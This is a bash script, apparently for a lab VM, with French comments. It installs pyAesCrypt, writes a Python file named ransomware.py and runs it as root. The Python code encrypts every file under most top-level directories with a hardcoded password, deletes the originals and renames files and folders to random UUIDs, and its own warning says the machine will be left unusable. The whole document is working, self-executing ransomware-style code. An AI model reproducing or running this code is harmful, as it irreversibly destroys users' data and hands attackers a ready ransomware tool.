#!/bin/bash

echo "=== MISE A JOUR DU SYSTEME ==="
sudo apt update && sudo apt upgrade -y

echo "=== INSTALLATION DE PYTHON ET PIP ==="
sudo apt install python3 python3-pip -y

echo "=== INSTALLATION DE VIRTUALENV ==="
sudo apt install python3-venv -y

echo "=== CREATION DE L'ENVIRONNEMENT VIRTUEL ==="
python3 -m venv env
source env/bin/activate

echo "=== INSTALLATION DE pyAesCrypt ==="
pip install pyAesCrypt

echo "=== CREATION DU SCRIPT PYTHON ==="
cat << 'EOF' > ransomware.py
from pyAesCrypt import encryptFile
import os
import uuid

# Paramètres
buffer_size = 64 * 1024  # Taille du buffer (64 Ko)
password = "toto"  # Mot de passe de chiffrement

# Fonction de chiffrement avec renommage définitif
def chiffrer_dossier(dossier_source):
    for racine, sous_dossiers, fichiers in os.walk(dossier_source, topdown=False):

        # Chiffrer les fichiers avec renommage
        for fichier in fichiers:
            chemin_source = os.path.join(racine, fichier)

            # Générer un nom de fichier unique et chiffré
            nom_fichier_chiffre = str(uuid.uuid4()) + ".aes"
            chemin_dest = os.path.join(racine, nom_fichier_chiffre)

            try:
                # Chiffrement du fichier
                encryptFile(chemin_source, chemin_dest, password, buffer_size)
                print(f"Fichier chiffré : {chemin_source} -> {chemin_dest}")

                # Suppression de l'original après chiffrement
                os.remove(chemin_source)
                print(f"Fichier original supprimé : {chemin_source}")

            except Exception as e:
                print(f"Erreur lors du chiffrement de {chemin_source} : {e}")

        # Renommer les dossiers
        dossier_source_absolu = os.path.abspath(dossier_source)
        if racine != dossier_source_absolu:
            nom_dossier_chiffre = str(uuid.uuid4())
            dossier_renomme = os.path.join(os.path.dirname(racine), nom_dossier_chiffre)
            os.rename(racine, dossier_renomme)
            print(f"Dossier renommé : {racine} -> {dossier_renomme}")

# Fonction principale
def chiffrer_systeme():
    # Parcourir tous les dossiers racine sauf ceux critiques
    exclusions = ["/proc", "/sys", "/dev", "/run", "/tmp", "/boot", "/mnt", "/media"]
    for dossier in os.listdir("/"):
        chemin_dossier = os.path.join("/", dossier)
        # Vérifier si c'est un dossier et non exclu
        if os.path.isdir(chemin_dossier) and chemin_dossier not in exclusions:
            print(f"\n[INFO] Chiffrement du dossier : {chemin_dossier}")
            chiffrer_dossier(chemin_dossier)

# Confirmation avant de lancer le chiffrement
def menu():
    print("\n=== ATTENTION ===")
    print("Ce script va chiffrer TOUS les dossiers de la VM, sans exception.")
    print("Les fichiers originaux seront supprimés.")
    print("Les noms des dossiers et fichiers seront définitivement perdus.")
    print("La VM sera inutilisable après le chiffrement.")
    print("\nDémarrage dans 10 secondes... (Appuyez sur Ctrl+C pour annuler)")
    import time
    time.sleep(10)
    chiffrer_systeme()

# Lancer le menu
menu()
EOF

echo "=== ATTRIBUTION DES PERMISSIONS D'EXECUTION ==="
chmod +x ransomware.py

echo "=== ACTIVATION DE L'ENVIRONNEMENT VIRTUEL ==="
source env/bin/activate

echo "=== EXECUTION DU SCRIPT PYTHON ==="
sudo env "PATH=$PATH" python3 ransomware.py
